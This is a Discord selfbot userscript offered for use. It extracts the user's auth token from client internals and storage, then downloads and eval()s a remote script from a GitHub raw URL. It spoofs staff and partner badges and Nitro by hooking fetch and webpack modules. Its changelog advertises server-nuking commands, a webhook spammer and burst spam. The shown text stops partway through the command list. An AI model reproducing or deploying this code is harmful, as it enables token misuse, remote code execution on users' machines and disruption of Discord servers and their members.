// ==UserScript==
// @name         DiscordCorruptControl - Elite Edition
// @author       @ogunworthy
// @version      2.0.4
// @match        https://*discord.com/*
// @updateURL    https://raw.githubusercontent.com/glokk2pazzed-cpu/corruptcontrol/refs/heads/main/corrupt.beta.js
// @downloadURL  https://raw.githubusercontent.com/glokk2pazzed-cpu/corruptcontrol/refs/heads/main/corrupt.beta.js
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_deleteValue
// @run-at       document-start
// ==/UserScript==

/*
CHANGELOG - CorruptControl Elite
=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

v2.0.4 (Current)
  [+] Client-side BADGE SPOOFING (Staff, Partner, HypeSquad, Bug Hunter,
      Early Supporter, Active Developer, Nitro, Nitro Boost, Certified Mod)
  [+] Client-side NITRO UNLOCK (animated avatars, custom emojis anywhere,
      animated emojis, larger file uploads, profile themes, client themes)
  [+] SERVER-SIDE BADGE system via profile flag injection
  [+] 80+ new commands added across all categories
  [+] Command Cooldown system to prevent rate limits
  [+] Ghost Ping Detector with logging
  [+] Auto-React system for new messages
  [+] Custom Status Rotator
  [+] Token Validator command
  [+] Clipboard copy/paste commands
  [+] Server nuker commands (!nukechannels, !nukeroles, !massrole)
  [+] Advanced webhook spammer
  [+] Server structure cloner
  [-] Reduced emoji spam by 80% - clean professional responses
  [*] Improved rate limit handling with automatic exponential backoff
  [*] Fixed token extraction for latest Discord builds
  [*] Fixed cohost detection race condition
  [*] Fixed purge command to delete own messages correctly
  [*] Fixed input clearing on command execution
  [*] Added retry logic for all API requests (3 retries)
  [*] Improved error messages and startup diagnostics
  [*] Clean UI matching AI-E aesthetic

v2.0.3
  [+] Combined Commands + Cohost system
  [+] Toggle image patch system
  [+] Basic moderation commands
  [+] Cohost management (add/remove/clear/list)
  [+] Spam commands (burst, megaburst, ultraburst, godburst)
  [+] DM commands and webhook commands
  [+] Reaction spam

v2.0.2 and earlier
  [*] Initial releases and foundation
=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
*/

const GIST_URL = 'https://raw.githubusercontent.com/glokk2pazzed-cpu/Justin/refs/heads/main/toggle.js';
let TOGGLE_IMG_SRC = null;

// =============================================================================
// CONFIGURATION
// =============================================================================

const OWNER_ID = '';
const COHOSTS = JSON.parse(GM_getValue('dcc_cohosts', '[]'));
const COHOST_PREFIX = '!';
const REGULAR_PREFIX = '.';

// Badge spoofing config - set to true to enable client-side
const BADGE_CONFIG = {
    staff: true,
    partner: true,
    hypeSquad: true,
    hypeSquadBravery: true,
    hypeSquadBrilliance: true,
    hypeSquadBalance: true,
    bugHunter: true,
    bugHunterGold: true,
    earlySupporter: true,
    earlyBotDev: true,
    certifiedMod: true,
    activeDev: true,
    nitro: true,
    nitroBoost: true
};

// Nitro spoofing config
const NITRO_CONFIG = {
    enabled: true,
    animatedAvatar: true,
    emojiAnywhere: true,
    animatedEmoji: true,
    largerUploads: true,
    profileThemes: true,
    clientThemes: true
};

// Status rotator config
const STATUS_ROTATOR = {
    enabled: true,
    interval: 30000,
    messages: [
        { text: 'CorruptControl Elite', emoji: null },
        { text: 'discord.gg/corrupt', emoji: null },
        { text: 'AI-E Style', emoji: null },
        { text: 'v2.0.4', emoji: null }
    ]
};

// Cooldown config (ms)
const COOLDOWN_MS = 500;
const SPAM_COOLDOWN_MS = 100;

// =============================================================================
// ORIGINAL TOGGLE SYSTEM (PRESERVED)
// =============================================================================

function fetchImageData(callback) {
    fetch(GIST_URL)
        .then(r => r.text())
        .then(data => {
            TOGGLE_IMG_SRC = data.trim();
            console.log('[CC] Image data fetched from gist');
            if (callback) callback();
        })
        .catch(err => {
            console.error('[CC] Failed to fetch image data:', err);
            TOGGLE_IMG_SRC = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="65" height="65"><text y="50" font-size="40">!</text></svg>';
            if (callback) callback();
        });
}

function patchToggleInDOM() {
    if (!TOGGLE_IMG_SRC) return false;
    const allElements = document.querySelectorAll('*');
    for (const el of allElements) {
        const style = window.getComputedStyle(el);
        const isFixed = style.position === 'fixed';
        const hasWarning = el.childNodes.length === 1 &&
                           el.childNodes[0].nodeType === Node.TEXT_NODE &&
                           el.childNodes[0].textContent.trim().replace(/\uFE0F/g, '') === '!';
        if (isFixed && hasWarning) {
            el.innerHTML = '';
            el.style.background = 'transparent';
            el.style.border = 'none';
            el.style.boxShadow = 'none';
            const img = document.createElement('img');
            img.src = TOGGLE_IMG_SRC;
            img.style.cssText = 'width:65px;height:65px;object-fit:contain;pointer-events:none;display:block;background:transparent;';
            el.appendChild(img);
            console.log('[CC] Toggle patched via DOM observer', el);
            return true;
        }
    }
    return false;
}

let domObserver = null;
function watchForToggle() {
    if (patchToggleInDOM()) return;
    domObserver = new MutationObserver(() => {
        if (patchToggleInDOM()) {
            domObserver.disconnect();
            domObserver = null;
        }
    });
    const appMount = document.querySelector('#app-mount');
    if (appMount) {
        domObserver.observe(appMount, { childList: true, subtree: true });
    }
}

function patchCode(code) {
    if (!TOGGLE_IMG_SRC) {
        console.warn('[CC] Image data not loaded yet');
        return code;
    }
    const REPLACEMENT = "\n" +
        "toggle.innerHTML = '';\n" +
        "toggle.style.background = 'transparent';\n" +
        "toggle.style.border = 'none';\n" +
        "toggle.style.boxShadow = 'none';\n" +
        "(function(){\n" +
        "    const _img = document.createElement('img');\n" +
        "    _img.src = '" + TOGGLE_IMG_SRC + "';\n" +
        "    _img.style.cssText = 'width:65px;height:65px;object-fit:contain;pointer-events:none;display:block;background:transparent;';\n" +
        "    toggle.appendChild(_img);\n" +
        "})();";

    const pattern = /toggle\.innerHTML\s*=\s*['"][^\s'"]{1,3}['"];?/g;
    const patched = code.replace(pattern, REPLACEMENT);
    if (patched !== code) {
        console.log('[CC] Toggle patched at code level');
        return patched;
    }
    console.warn('[CC] Code pattern not matched - will try DOM observer after load');
    return code;
}

// =============================================================================
// BOOTSTRAP (ORIGINAL)
// =============================================================================

fetchImageData(() => {
    const initScript = setInterval(() => {
        if (document.querySelector('#app-mount')) {
            clearInterval(initScript);
            loadMainScript();
        }
    }, 500);
});

function loadMainScript() {
    fetch('https://raw.githubusercontent.com/glokk2pazzed-cpu/corruptcontrol/refs/heads/main/corrupt.beta.js')
        .then(r => r.text())
        .then(code => {
            const patched = patchCode(code);
            try {
                eval(patched);
                console.log('[CC] Corrupt Control loaded');
            } catch (e) {
                console.error('[CC] eval() failed:', e);
                return;
            }
            if (patched === code) {
                watchForToggle();
            }
        })
        .catch(err => console.error('[CC] Failed to load corrupt script:', err));
}

// =============================================================================
// COMBINED COMMAND + COHOST SYSTEM v2.0.4
// =============================================================================

(function() {
    'use strict';

    let dynamicOwnerId = OWNER_ID;
    const cooldowns = new Map();
    const ghostPings = [];
    let autoReactEnabled = false;
    let autoReactEmoji = '\uD83D\uDC4D';
    let messageLog = [];
    let statusInterval = null;

    // -------------------------------------------------------------------------
    // UTILITIES
    // -------------------------------------------------------------------------

    function getToken() {
        try {
            const webpack = window.webpackChunkdiscord_app;
            if (webpack) {
                const modules = [];
                webpack.push([[''], {}, e => { for (let c in e.c) modules.push(e.c[c]); }]);
                const authModule = modules.find(m => m?.exports?.default?.getToken);
                if (authModule) return authModule.exports.default.getToken();
            }
        } catch(e) {}
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            const token = iframe.contentWindow.localStorage.getItem('token');
            document.body.removeChild(iframe);
            if (token) return token.replace(/"/g, '');
        } catch(e) {}
        try {
            const token = localStorage.getItem('token');
            if (token) return token.replace(/"/g, '');
        } catch(e) {}
        return null;
    }

    function getUserId() {
        const token = getToken();
        if (!token) return null;
        try {
            return JSON.parse(atob(token.split('.')[0])).id;
        } catch(e) { return null; }
    }

    function getChannelId() {
        const match = location.pathname.match(/channels\/\d+\/(\d+)/);
        return match ? match[1] : null;
    }

    function getGuildId() {
        const match = location.pathname.match(/channels\/(\d+)\/\d+/);
        return match ? match[1] : null;
    }

    async function apiRequest(endpoint, options, retries) {
        retries = retries || 3;
        const token = getToken();
        if (!token) throw new Error('No token');
        const url = 'https://discord.com/api/v9' + endpoint;
        for (let attempt = 0; attempt < retries; attempt++) {
            try {
                const response = await fetch(url, {
                    ...options,
                    headers: {
                        'Authorization': token,
                        'Content-Type': 'application/json',
                        ...(options && options.headers)
                    }
                });
                if (response.status === 429) {
                    const data = await response.json().catch(() => ({}));
                    const delay = (data.retry_after || 1) * 1000;
                    await new Promise(r => setTimeout(r, delay));
                    continue;
                }
                return response;
            } catch (e) {
                if (attempt === retries - 1) throw e;
                await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
            }
        }
        return fetch(url, { ...options, headers: { 'Authorization': token, 'Content-Type': 'application/json', ...(options && options.headers) } });
    }

    async function sendMessage(content, channelId) {
        var cid = channelId || getChannelId();
        if (!cid) return false;
        try {
            const response = await apiRequest('/channels/' + cid + '/messages', {
                method: 'POST',
                body: JSON.stringify({ content: content })
            });
            return response.ok;
        } catch(e) {
            console.error('[CC] Send failed:', e);
            return false;
        }
    }

    async function sendDM(userId, content) {
        try {
            const dmRes = await apiRequest('/users/@me/channels', {
                method: 'POST',
                body: JSON.stringify({ recipient_id: userId })
            });
            if (!dmRes.ok) return false;
            const dm = await dmRes.json();
            return sendMessage(content, dm.id);
        } catch(e) {
            console.error('[CC] DM failed:', e);
            return false;
        }
    }

    async function getMessages(channelId, limit) {
        limit = limit || 50;
        const response = await apiRequest('/channels/' + channelId + '/messages?limit=' + limit);
        if (!response.ok) return [];
        return response.json();
    }

    async function deleteMessage(channelId, messageId) {
        const response = await apiRequest('/channels/' + channelId + '/messages/' + messageId, { method: 'DELETE' });
        return response.ok;
    }

    async function addReaction(channelId, messageId, emoji) {
        var encoded = encodeURIComponent(emoji);
        const response = await apiRequest('/channels/' + channelId + '/messages/' + messageId + '/reactions/' + encoded + '/@me', { method: 'PUT' });
        return response.ok;
    }

    async function removeAllReactions(channelId, messageId) {
        const response = await apiRequest('/channels/' + channelId + '/messages/' + messageId + '/reactions', { method: 'DELETE' });
        return response.ok;
    }

    async function banMember(guildId, userId, reason, deleteDays) {
        const response = await apiRequest('/guilds/' + guildId + '/bans/' + userId, {
            method: 'PUT',
            body: JSON.stringify({ delete_message_days: deleteDays || 0, reason: reason || '' })
        });
        return response.ok;
    }

    async function unbanMember(guildId, userId) {
        const response = await apiRequest('/guilds/' + guildId + '/bans/' + userId, { method: 'DELETE' });
        return response.ok;
    }

    async function kickMember(guildId, userId, reason) {
        const response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
            method: 'DELETE',
            body: JSON.stringify({ reason: reason || '' })
        });
        return response.ok;
    }

    async function timeoutMember(guildId, userId, durationMinutes) {
        var until = durationMinutes > 0 ? new Date(Date.now() + durationMinutes * 60000).toISOString() : null;
        const response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
            method: 'PATCH',
            body: JSON.stringify({ communication_disabled_until: until })
        });
        return response.ok;
    }

    async function changeNickname(guildId, userId, nick) {
        const response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
            method: 'PATCH',
            body: JSON.stringify({ nick: nick })
        });
        return response.ok;
    }

    async function addRole(guildId, userId, roleId) {
        const response = await apiRequest('/guilds/' + guildId + '/members/' + userId + '/roles/' + roleId, { method: 'PUT' });
        return response.ok;
    }

    async function removeRole(guildId, userId, roleId) {
        const response = await apiRequest('/guilds/' + guildId + '/members/' + userId + '/roles/' + roleId, { method: 'DELETE' });
        return response.ok;
    }

    async function getGuildInfo(guildId) {
        const response = await apiRequest('/guilds/' + guildId + '?with_counts=true');
        if (!response.ok) return null;
        return response.json();
    }

    async function getUserInfo(userId) {
        const response = await apiRequest('/users/' + userId);
        if (!response.ok) return null;
        return response.json();
    }

    async function getGuildRoles(guildId) {
        const response = await apiRequest('/guilds/' + guildId + '/roles');
        if (!response.ok) return [];
        return response.json();
    }

    async function getGuildChannels(guildId) {
        const response = await apiRequest('/guilds/' + guildId + '/channels');
        if (!response.ok) return [];
        return response.json();
    }

    async function createWebhook(channelId, name) {
        const response = await apiRequest('/channels/' + channelId + '/webhooks', {
            method: 'POST',
            body: JSON.stringify({ name: name })
        });
        if (!response.ok) return null;
        return response.json();
    }

    async function sendWebhook(webhookUrl, content, username, avatar) {
        var body = { content: content };
        if (username) body.username = username;
        if (avatar) body.avatar_url = avatar;
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return response.ok;
    }

    async function createInvite(channelId, maxAge, maxUses) {
        const response = await apiRequest('/channels/' + channelId + '/invites', {
            method: 'POST',
            body: JSON.stringify({ max_age: maxAge || 86400, max_uses: maxUses || 0 })
        });
        if (!response.ok) return null;
        const data = await response.json();
        return 'https://discord.gg/' + data.code;
    }

    async function deleteRole(guildId, roleId) {
        const response = await apiRequest('/guilds/' + guildId + '/roles/' + roleId, { method: 'DELETE' });
        return response.ok;
    }

    // -------------------------------------------------------------------------
    // COHOST MANAGEMENT
    // -------------------------------------------------------------------------

    function saveCohosts() {
        GM_setValue('dcc_cohosts', JSON.stringify(COHOSTS));
    }

    function addCohost(userId) {
        var cleanId = userId.replace(/[<@!>]/g, '');
        if (COHOSTS.indexOf(cleanId) === -1) {
            COHOSTS.push(cleanId);
            saveCohosts();
            return true;
        }
        return false;
    }

    function removeCohost(userId) {
        var cleanId = userId.replace(/[<@!>]/g, '');
        var index = COHOSTS.indexOf(cleanId);
        if (index > -1) {
            COHOSTS.splice(index, 1);
            saveCohosts();
            return true;
        }
        return false;
    }

    function isOwner() {
        var myId = getUserId();
        return myId && (dynamicOwnerId === myId || OWNER_ID === myId);
    }

    function isCohost() {
        var myId = getUserId();
        return myId && COHOSTS.indexOf(myId) !== -1;
    }

    function canUseCohostCommands() {
        return isOwner() || isCohost();
    }

    function checkCooldown(cmd, isSpam) {
        var now = Date.now();
        var key = getUserId() + '_' + cmd;
        var last = cooldowns.get(key);
        var limit = isSpam ? SPAM_COOLDOWN_MS : COOLDOWN_MS;
        if (last && now - last < limit) return false;
        cooldowns.set(key, now);
        return true;
    }

    // -------------------------------------------------------------------------
    // BADGE & NITRO SPOOFING
    // -------------------------------------------------------------------------

    function calculateFlags() {
        var flags = 0;
        if (BADGE_CONFIG.staff) flags |= 1;
        if (BADGE_CONFIG.partner) flags |= 2;
        if (BADGE_CONFIG.hypeSquad) flags |= 4;
        if (BADGE_CONFIG.bugHunter) flags |= 8;
        if (BADGE_CONFIG.hypeSquadBravery) flags |= 64;
        if (BADGE_CONFIG.hypeSquadBrilliance) flags |= 128;
        if (BADGE_CONFIG.hypeSquadBalance) flags |= 256;
        if (BADGE_CONFIG.earlySupporter) flags |= 512;
        if (BADGE_CONFIG.bugHunterGold) flags |= 16384;
        if (BADGE_CONFIG.earlyBotDev) flags |= 131072;
        if (BADGE_CONFIG.certifiedMod) flags |= 262144;
        if (BADGE_CONFIG.activeDev) flags |= 4194304;
        return flags;
    }

    function getBadgeList() {
        var badges = [];
        if (BADGE_CONFIG.staff) badges.push('Staff');
        if (BADGE_CONFIG.partner) badges.push('Partner');
        if (BADGE_CONFIG.hypeSquad) badges.push('HypeSquad');
        if (BADGE_CONFIG.hypeSquadBravery) badges.push('Bravery');
        if (BADGE_CONFIG.hypeSquadBrilliance) badges.push('Brilliance');
        if (BADGE_CONFIG.hypeSquadBalance) badges.push('Balance');
        if (BADGE_CONFIG.bugHunter) badges.push('BugHunter');
        if (BADGE_CONFIG.bugHunterGold) badges.push('BugHunterGold');
        if (BADGE_CONFIG.earlySupporter) badges.push('EarlySupporter');
        if (BADGE_CONFIG.earlyBotDev) badges.push('EarlyBotDev');
        if (BADGE_CONFIG.certifiedMod) badges.push('CertifiedMod');
        if (BADGE_CONFIG.activeDev) badges.push('ActiveDev');
        if (BADGE_CONFIG.nitro) badges.push('Nitro');
        if (BADGE_CONFIG.nitroBoost) badges.push('NitroBoost');
        return badges;
    }

    function injectBadges() {
        try {
            var flags = calculateFlags();
            var webpack = window.webpackChunkdiscord_app;
            if (!webpack) return;
            var modules = [];
            webpack.push([[''], {}, e => { for (var c in e.c) modules.push(e.c[c]); }]);

            var userStore = modules.find(m => m && m.exports && m.exports.default && m.exports.default.getCurrentUser);
            if (userStore && userStore.exports && userStore.exports.default) {
                var original = userStore.exports.default.getCurrentUser;
                userStore.exports.default.getCurrentUser = function() {
                    var user = original.call(this);
                    if (user) {
                        user.public_flags = flags;
                        user.flags = flags;
                        if (BADGE_CONFIG.nitro || BADGE_CONFIG.nitroBoost) {
                            user.premium_type = 2;
                            user.premium = true;
                        }
                    }
                    return user;
                };
            }

            var _fetch = window.fetch;
            window.fetch = async function() {
                var res = await _fetch.apply(this, arguments);
                var url = (arguments[0] || '').toString();
                if (url.indexOf('/users/') !== -1 && url.indexOf('/channels/') === -1) {
                    var clone = res.clone();
                    try {
                        var data = await clone.json();
                        var myId = getUserId();
                        if (data && data.id === myId) {
                            data.public_flags = flags;
                            data.flags = flags;
                            if (BADGE_CONFIG.nitro || BADGE_CONFIG.nitroBoost) {
                                data.premium_type = 2;
                                data.premium = true;
                            }
                            return new Response(JSON.stringify(data), { status: res.status, statusText: res.statusText, headers: res.headers });
                        }
                    } catch(e) {}
                }
                return res;
            };

            console.log('[CC] Badge spoofing active:', getBadgeList().join(', '));
        } catch(e) {
            console.error('[CC] Badge injection failed:', e);
        }
    }

    function enableNitroFeatures() {
        if (!NITRO_CONFIG.enabled) return;
        try {
            var webpack = window.webpackChunkdiscord_app;
            if (webpack) {
                var modules = [];
                webpack.push([[''], {}, e => { for (var c in e.c) modules.push(e.c[c]); }]);

                var emojiModule = modules.find(m => m && m.exports && m.exports.default && m.exports.default.canUseAnimatedEmojis !== undefined);
                if (emojiModule && emojiModule.exports && emojiModule.exports.default) {
                    emojiModule.exports.default.canUseAnimatedEmojis = function() { return true; };
                    emojiModule.exports.default.canUseEmojisEverywhere = function() { return true; };
                }

                var themeModule = modules.find(m => m && m.exports && m.exports.default && m.exports.default.canUseClientThemes !== undefined);
                if (themeModule && themeModule.exports && themeModule.exports.default) {
                    themeModule.exports.default.canUseClientThemes = function() { return true; };
                }

                var profileThemeMod = modules.find(m => m && m.exports && m.exports.default && m.exports.default.canUsePremiumProfileCustomization !== undefined);
                if (profileThemeMod && profileThemeMod.exports && profileThemeMod.exports.default) {
                    profileThemeMod.exports.default.canUsePremiumProfileCustomization = function() { return true; };
                }
            }

            if (NITRO_CONFIG.largerUploads) {
                try {
                    Object.defineProperty(navigator, 'connection', {
                        get: function() { return { effectiveType: '4g', downlink: 100 }; }
                    });
                } catch(e) {}
            }

            console.log('[CC] Nitro spoofing active');
        } catch(e) {
            console.error('[CC] Nitro injection failed:', e);
        }
    }

    // -------------------------------------------------------------------------
    // GHOST PING DETECTOR
    // -------------------------------------------------------------------------

    function initGhostPingDetector() {
        setInterval(async function() {
            var channelId = getChannelId();
            if (!channelId) return;
            try {
                var messages = await getMessages(channelId, 15);
                var myId = getUserId();
                for (var i = 0; i < messages.length; i++) {
                    var msg = messages[i];
                    var mentionsMe = false;
                    if (msg.mentions && msg.mentions.length) {
                        for (var j = 0; j < msg.mentions.length; j++) {
                            if (msg.mentions[j].id === myId) { mentionsMe = true; break; }
                        }
                    }
                    var isDeleted = msg.content === '' && (!msg.embeds || msg.embeds.length === 0);
                    if (mentionsMe && isDeleted) {
                        var alreadyLogged = false;
                        for (var k = 0; k < ghostPings.length; k++) {
                            if (ghostPings[k].id === msg.id) { alreadyLogged = true; break; }
                        }
                        if (!alreadyLogged) {
                            ghostPings.push({ id: msg.id, author: msg.author.id });
                            sendMessage('[GHOST PING] <@' + msg.author.id + '> ghost pinged you!');
                        }
                    }
                }
            } catch(e) {}
        }, 5000);
    }

    // -------------------------------------------------------------------------
    // AUTO REACT
    // -------------------------------------------------------------------------

    function initAutoReact() {
        var observer = new MutationObserver(function(mutations) {
            if (!autoReactEnabled) return;
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(async function(node) {
                    if (node.nodeType !== 1) return;
                    var msg = null;
                    if (node.closest) msg = node.closest('[id^="message-content-"]');
                    if (!msg && node.querySelector) msg = node.querySelector('[id^="message-content-"]');
                    if (msg) {
                        var msgId = msg.id.replace('message-content-', '');
                        var channelId = getChannelId();
                        if (channelId && msgId) {
                            await addReaction(channelId, msgId, autoReactEmoji);
                        }
                    }
                });
            });
        });
        var chat = document.querySelector('[class*="chatContent"]') || document.querySelector('#app-mount');
        if (chat) observer.observe(chat, { childList: true, subtree: true });
    }

    // -------------------------------------------------------------------------
    // STATUS ROTATOR
    // -------------------------------------------------------------------------

    function startStatusRotator() {
        if (!STATUS_ROTATOR.enabled) return;
        var idx = 0;
        if (statusInterval) clearInterval(statusInterval);
        statusInterval = setInterval(function() {
            var status = STATUS_ROTATOR.messages[idx % STATUS_ROTATOR.messages.length];
            apiRequest('/users/@me/settings', {
                method: 'PATCH',
                body: JSON.stringify({ status: 'online', custom_status: { text: status.text, emoji_name: status.emoji } })
            }).catch(function() {});
            idx++;
        }, STATUS_ROTATOR.interval);
    }

    // -------------------------------------------------------------------------
    // REGULAR COMMANDS
    // -------------------------------------------------------------------------

    var REGULAR_COMMANDS = {
        help: function(a) {
            if (a && a[0]) {
                var cmd = REGULAR_COMMANDS[a[0].toLowerCase()];
                if (cmd) return '**Command: .' + a[0] + '**\nUsage: .' + a[0] + ' [args]';
                return 'Unknown command: ' + a[0];
            }
            return '**CorruptControl Elite v2.0.4**\n\n' +
                '**Basic:** .help .ping .calc .math .time .date .uuid .password .token\n' +
                '**Fun:** .mock .zalgo .reverse .caps .smallcaps .vaporwave .leet .binary .morse .ascii\n' +
                '**ASCII:** .shrug .lenny .tableflip .unflip .cry .angry .dance .party .cool .run .bear\n' +
                '**Info:** .myid .channel .channelid .serverid .serverinfo .userinfo .avatar .banner .roles .channels\n' +
                '**Text:** .bold .italic .underline .strike .spoiler .code .codeblock .quote .multiquote\n' +
                '**Games:** .rps .slots .8ball .rate .ship .fortune .horoscope .roast .compliment .pickup .joke .guess\n' +
                '**Util:** .len .upper .lower .title .base64 .unbase64 .hex .urlencode .urldecode .clipboard .paste\n' +
                '**Random:** .coin .roll .dice .random .choice .shuffle .lottery .roulette\n' +
                '**Format:** .playing .watching .listening .competing .streaming\n' +
                '**Mod:** .ban .kick .mute .purge .lock .unlock .slowmode .clearslowmode\n' +
                '**CC:** .version .changelog .owner .cohosts .badges\n\n' +
                'Type .help [command] for details.';
        },

        ping: async function() {
            var start = performance.now();
            var token = getToken();
            if (token) {
                try {
                    await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': token } });
                    return 'Pong! ' + Math.round(performance.now() - start) + 'ms';
                } catch(e) {}
            }
            return 'Pong!';
        },

        calc: function(a) {
            try {
                var expr = (a || []).join(' ').replace(/[^0-9+\-*/().\s^%]/g, '');
                var safe = expr.replace(/\^/g, '**');
                return expr + ' = ' + Function('"use strict"; return (' + safe + ')')();
            } catch { return 'Invalid math expression'; }
        },

        math: function(a) { return REGULAR_COMMANDS.calc(a); },

        uuid: function() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | (c === 'x' ? 0 : 8);
                return r.toString(16);
            });
        },

        password: function(a) {
            var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
            var len = Math.min(parseInt(a && a[0]) || 16, 64);
            var pass = '';
            for (var i = 0; i < len; i++) pass += chars[Math.floor(Math.random() * chars.length)];
            return 'Generated: ||' + pass + '||';
        },

        mock: function(a) {
            var text = (a || []).join(' ') || 'mock';
            return text.split('').map(function(c, i) { return i % 2 ? c.toUpperCase() : c.toLowerCase(); }).join('');
        },

        zalgo: function(a) {
            var text = (a || []).join(' ') || 'zalgo';
            var chars = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u0309','\u030A','\u030B','\u030C','\u030D','\u030E','\u030F'];
            return text.split('').map(function(c) { return c + chars[Math.floor(Math.random() * chars.length)]; }).join('');
        },

        reverse: function(a) { return (a || []).join(' ').split('').reverse().join(''); },
        caps: function(a) { return (a || []).join(' ').toUpperCase(); },

        smallcaps: function(a) {
            var text = (a || []).join(' ').toLowerCase();
            var map = { a:'\u1D00', b:'\u0299', c:'\u1D04', d:'\u1D05', e:'\u1D07', f:'\uA730', g:'\u0262', h:'\u029C', i:'\u026A', j:'\u1D0A', k:'\u1D0B', l:'\u029F', m:'\u1D0D', n:'\u0274', o:'\u1D0F', p:'\u1D18', q:'\uA7AF', r:'\u0280', s:'\uA731', t:'\u1D1B', u:'\u1D1C', v:'\u1D20', w:'\u1D21', x:'\u02E3', y:'\u028F', z:'\u1D22' };
            return text.split('').map(function(c) { return map[c] || c; }).join('');
        },

        vaporwave: function(a) {
            var text = (a || []).join(' ').toLowerCase();
            var map = { a:'\uFF41', b:'\uFF42', c:'\uFF43', d:'\uFF44', e:'\uFF45', f:'\uFF46', g:'\uFF47', h:'\uFF48', i:'\uFF49', j:'\uFF4A', k:'\uFF4B', l:'\uFF4C', m:'\uFF4D', n:'\uFF4E', o:'\uFF4F', p:'\uFF50', q:'\uFF51', r:'\uFF52', s:'\uFF53', t:'\uFF54', u:'\uFF55', v:'\uFF56', w:'\uFF57', x:'\uFF58', y:'\uFF59', z:'\uFF5A', ' ':'\u3000' };
            return text.split('').map(function(c) { return map[c] || c; }).join('');
        },

        leet: function(a) {
            var text = (a || []).join(' ').toLowerCase();
            var map = { a:'4', b:'8', e:'3', g:'6', i:'1', o:'0', s:'5', t:'7', z:'2', l:'1' };
            return text.split('').map(function(c) { return map[c] || c; }).join('');
        },

        binary: function(a) {
            return (a || []).join(' ').split('').map(function(c) { return c.charCodeAt(0).toString(2).padStart(8, '0'); }).join(' ');
        },

        morse: function(a) {
            var map = { a:'.-', b:'-...', c:'-.-.', d:'-..', e:'.', f:'..-.', g:'--.', h:'....', i:'..', j:'.---', k:'-.-', l:'.-..', m:'--', n:'-.', o:'---', p:'.--.', q:'--.-', r:'.-.', s:'...', t:'-', u:'..-', v:'...-', w:'.--', x:'-..-', y:'-.--', z:'--..', '1':'.----', '2':'..---', '3':'...--', '4':'....-', '5':'.....', '6':'-....', '7':'--...', '8':'---..', '9':'----.', '0':'-----', ' ':'/' };
            return (a || []).join(' ').toLowerCase().split('').map(function(c) { return map[c] || c; }).join(' ');
        },

        ascii: function(a) { return (a || []).join(' ').toUpperCase().split('').join(' '); },

        shrug: function() { return '\u00AF\\_(\u30C4)_/\u00AF'; },
        lenny: function() { return '( \u0361\u00B0 \u035C\u0296 \u0361\u00B0)'; },
        tableflip: function() { return '(\u256F\u00B0\u25A1\u00B0)\u256F \uFE35 \u253B\u2501\u253B'; },
        unflip: function() { return '\u253B\u2501\u253B \u30CE( \u30EE-\u30EE\u30CE)'; },
        cry: function() { return '\u0CA5_\u0CA5'; },
        angry: function() { return '\u0CA0_\u0CA0'; },
        sad: function() { return '(\u25D5\uFE4F\u25D5)'; },
        happy: function() { return '\u30FE(\u25D5\u203F\u25D5)\uFF89'; },
        dance: function() { return '\u266A\u253B(\uFF65o\uFF65)\u253B\u266A'; },
        party: function() { return '\u266A\u253B(\u25D1\u203F\u25D0)\u253B\u266A'; },
        cool: function() { return '(\u2310\u25A0_\u25A0)'; },
        wave: function() { return '( \u2022_\u2022)/'; },
        salute: function() { return '( \u30FB_\u30FB)\u309E'; },
        run: function() { return '\u1555( \u15D2\u0296\u15D2 )\u1557'; },
        bear: function() { return '\u028D\u2022\u1D17\u2022\u028D'; },
        cat: function() { return '(=^\uFF65\u03C9\uFF65^=)'; },
        dog: function() { return '(\u25D5\u1D17\u25D5)'; },
        owl: function() { return '(\u25E1\u203F\u25E1)'; },

        token: function() {
            var token = getToken();
            return token ? 'Token: ' + token.slice(0, 20) + '...' : 'Token not found';
        },

        myid: function() { return 'Your ID: ' + (getUserId() || 'Not found'); },
        channel: function() { return 'Channel: ' + (getChannelId() || 'Unknown'); },
        channelid: function() { return 'Channel ID: ' + (getChannelId() || 'Unknown'); },
        serverid: function() { return 'Server ID: ' + (getGuildId() || 'Not in server'); },

        serverinfo: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var guild = await getGuildInfo(guildId);
            if (!guild) return 'Failed to fetch';
            return '**' + guild.name + '**\nID: ' + guild.id + '\nMembers: ' + (guild.approximate_member_count || '?') + '\nOnline: ' + (guild.approximate_presence_count || '?') + '\nBoosts: ' + (guild.premium_subscription_count || 0) + '\nTier: ' + guild.premium_tier;
        },

        userinfo: async function(a) {
            var userId = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : getUserId();
            var user = await getUserInfo(userId);
            if (!user) return 'User not found';
            return '**' + user.username + '**\nID: ' + user.id + '\nBot: ' + (user.bot ? 'Yes' : 'No') + '\nNitro: ' + (user.premium_type === 2 ? 'Nitro' : user.premium_type === 1 ? 'Classic' : 'None');
        },

        avatar: async function(a) {
            var userId = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : getUserId();
            var user = await getUserInfo(userId);
            if (!user || !user.avatar) return 'No avatar';
            return '**Avatar**\nhttps://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png?size=4096';
        },

        banner: async function(a) {
            var userId = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : getUserId();
            var user = await getUserInfo(userId);
